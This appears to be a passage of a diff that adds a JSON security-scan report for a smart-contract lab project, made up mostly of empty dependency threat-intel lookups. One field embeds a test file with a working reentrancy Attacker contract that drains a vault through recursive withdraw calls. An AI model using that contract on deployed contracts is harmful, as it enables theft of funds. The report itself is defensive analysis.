+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"eslint\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ts-node",
+          "packageVersion": "10.9.2",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ts-node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "tsx",
+          "packageVersion": "4.21.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"tsx\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "typescript",
+          "packageVersion": "5.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"typescript\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "vitest",
+          "packageVersion": "1.6.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"vitest\" in the last 14 days",
+          "recommendations": []
+        }
+      ],
+      "exploitSim": {
+        "scenarioId": "reentrancy-101",
+        "scenarioName": "Reentrancy Vault Drain",
+        "success": false,
+        "aiReport": null,
+        "output": "Error: connect ECONNREFUSED 127.0.0.1:8545",
+        "severity": "critical"
+      },
+      "overallSeverity": "high",
+      "threatScore": 31,
+      "findings": [],
+      "recommendations": [
+        "Review contract with a professional audit",
+        "Use Slither or Mythril for static analysis",
+        "Implement CEI pattern (Checks-Effects-Interactions)"
+      ],
+      "durationMs": 1564,
+      "errors": []
+    },
+    {
+      "file": "test\\ReentrancyVault.t.sol",
+      "staticAnalysis": {
+        "patterns": [
+          {
+            "pattern": "reentrancy",
+            "confidence": 0.30000000000000004,
+            "matchedOn": [
+              "reentranc",
+              "recursive",
+              "call{value"
+            ],
+            "similarReports": []
+          }
+        ],
+        "aiReport": {
+          "reportId": "e5a60ebf-7221-4960-8e04-f114330b26a1",
+          "scenarioId": "scan:test\\ReentrancyVault.t.sol",
+          "attackPattern": "reentrancy",
+          "severity": "high",
+          "summary": "Signature-based detection: likely reentrancy attack. Manual review recommended.",
+          "findings": [
+            {
+              "title": "Potential reentrancy vulnerability",
+              "description": "Signature-based detection: likely reentrancy attack. Manual review recommended.",
+              "evidence": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { Script } from 'forge-std/Script.sol';\nimport { Test, console } from 'forge-std/Test.sol';\nimport '../contracts/ReentrancyVault.sol';\n\n/**\n * @title ReentrancyVault Test\n * @notice Tests for the ReentrancyVault exploit scenario.\n *         These tests verify the vulnerability exists and demonstrate the attack.\n */\ncontract ReentrancyVaultTest is Test {\n    ReentrancyVault public vault;\n    Attacker public attacker;\n\n    uint256 co"
+            }
+          ],
+          "aiModel": "bankr-default",
+          "confidence": 0.4,
+          "recommendations": [
+            "Review contract with a professional audit",
+            "Use Slither or Mythril for static analysis",
+            "Implement CEI pattern (Checks-Effects-Interactions)"
+          ],
+          "createdAt": "2026-04-21T13:31:06.071Z"
+        },
+        "contractCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { Script } from 'forge-std/Script.sol';\nimport { Test, console } from 'forge-std/Test.sol';\nimport '../contracts/ReentrancyVault.sol';\n\n/**\n * @title ReentrancyVault Test\n * @notice Tests for the ReentrancyVault exploit scenario.\n *         These tests verify the vulnerability exists and demonstrate the attack.\n */\ncontract ReentrancyVaultTest is Test {\n    ReentrancyVault public vault;\n    Attacker public attacker;\n\n    uint256 constant VAULT_FUND = 10 ether;\n    uint256 constant ATTACK_FUND = 1 ether;\n\n    function setUp() public {\n        vault = new ReentrancyVault();\n        attacker = new Attacker{value: ATTACK_FUND}(address(vault));\n\n        // Fund the vault\n        vm.deal(address(this), VAULT_FUND + 1 ether);\n        (bool success,) = address(vault).call{value: VAULT_FUND}(\"\");\n        require(success, \"Vault funding failed\");\n    }\n\n    function test_vaultHasCorrectBalance() public {\n        assertEq(address(vault).balance, VAULT_FUND);\n    }\n\n    function test_vaultDepositWorks() public {\n        vault.deposit{value: 1 ether}();\n        assertEq(vault.balances(address(this)), 1 ether);\n    }\n\n    function test_vaultWithdrawWorks() public {\n        vault.deposit{value: 1 ether}();\n        vault.withdraw(1 ether);\n        assertEq(vault.balances(address(this)), 0);\n    }\n\n    // ── Exploit test ─────────────────────────────────────────────────────────\n\n    function test_reentrancyAttackDrainsVault() public {\n        uint256 vaultBalanceBefore = address(vault).balance;\n        uint256 attackerBalanceBefore = address(attacker).balance;\n\n        // Execute the attack\n        attacker.attack(VAULT_FUND);\n\n        uint256 vaultBalanceAfter = address(vault).balance;\n        uint256 attackerBalanceAfter = address(attacker).balance;\n\n        // Vault should be drained\n        assertEq(vaultBalanceAfter, 0);\n        // Attacker should have gained at least the vault balance\n        assertGt(attackerBalanceAfter, attackerBalanceBefore);\n        emit log_named_uint(\"[EXPLOIT] Vault drained:\", vaultBalanceBefore - vaultBalanceAfter);\n        emit log_named_uint(\"[EXPLOIT] Attacker profit:\", attackerBalanceAfter - attackerBalanceBefore);\n    }\n\n    function test_canary_deployerBalance() public {\n        // Sanity check: deployer still has ETH after funding\n        assertGt(address(this).balance, 0);\n    }\n}\n\n/**\n * @title Attacker — Reentrancy exploit contract\n * @notice Executes the reentrancy attack by recursively calling withdraw.\n */\ncontract Attacker {\n    ReentrancyVault public vault;\n    bool public isAttacking;\n\n    constructor(address _vault) payable {\n        vault = ReentrancyVault(_vault);\n        vault.deposit{value: msg.value}();\n    }\n\n    function attack(uint256 amount) external {\n        isAttacking = true;\n        vault.withdraw(amount);\n        isAttacking = false;\n    }\n\n    // Fallback — this is where the reentrancy happens\n    receive() external payable {\n        if (address(vault).balance >= 1 ether && isAttacking) {\n            vault.withdraw(1 ether);\n        }\n    }\n}\n"
+      },
+      "dependencyAudit": {
+        "summary": "Found 4 issues",
+        "threatLevel": "medium",
+        "vulns": [
+          {
+            "package": "0",
+            "severity": "medium",
+            "title": "Vulnerability in esbuild",
+            "url": ""
+          },
+          {
+            "package": "1",
+            "severity": "medium",
+            "title": "Vulnerability in vite",
+            "url": ""
+          },
+          {
+            "package": "2",
+            "severity": "medium",
+            "title": "Vulnerability in vite-node",
+            "url": ""
+          },
+          {
+            "package": "3",
+            "severity": "medium",
+            "title": "Vulnerability in vitest",
+            "url": ""
+          }
+        ],
+        "advisories": [],
+        "score": 50
+      },
+      "threatIntel": [
+        {
+          "packageName": "axios",
+          "packageVersion": "1.7.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"axios\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "dotenv",
+          "packageVersion": "16.4.5",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"dotenv\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ethers",
+          "packageVersion": "6.13.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ethers\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "semver",
+          "packageVersion": "7.7.4",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"semver\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "zod",
+          "packageVersion": "3.23.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"zod\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@types/node",
+          "packageVersion": "22.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@types/node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/eslint-plugin",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/eslint-plugin\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/parser",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/parser\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "eslint",
+          "packageVersion": "9.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"eslint\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ts-node",
+          "packageVersion": "10.9.2",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ts-node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "tsx",
+          "packageVersion": "4.21.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"tsx\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "typescript",
+          "packageVersion": "5.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"typescript\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "vitest",
+          "packageVersion": "1.6.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"vitest\" in the last 14 days",
+          "recommendations": []
+        }
+      ],
+      "exploitSim": {
+        "scenarioId": "reentrancy-101",
+        "scenarioName": "Reentrancy Vault Drain",
+        "success": false,
+        "aiReport": null,
+        "output": "Error: connect ECONNREFUSED 127.0.0.1:8545",
+        "severity": "critical"
+      },
+      "overallSeverity": "high",
+      "threatScore": 31,
+      "findings": [],
+      "recommendations": [
+        "Review contract with a professional audit",
+        "Use Slither or Mythril for static analysis",
+        "Implement CEI pattern (Checks-Effects-Interactions)"
+      ],
+      "durationMs": 1318,
+      "errors": []
+    }
+  ]
+}
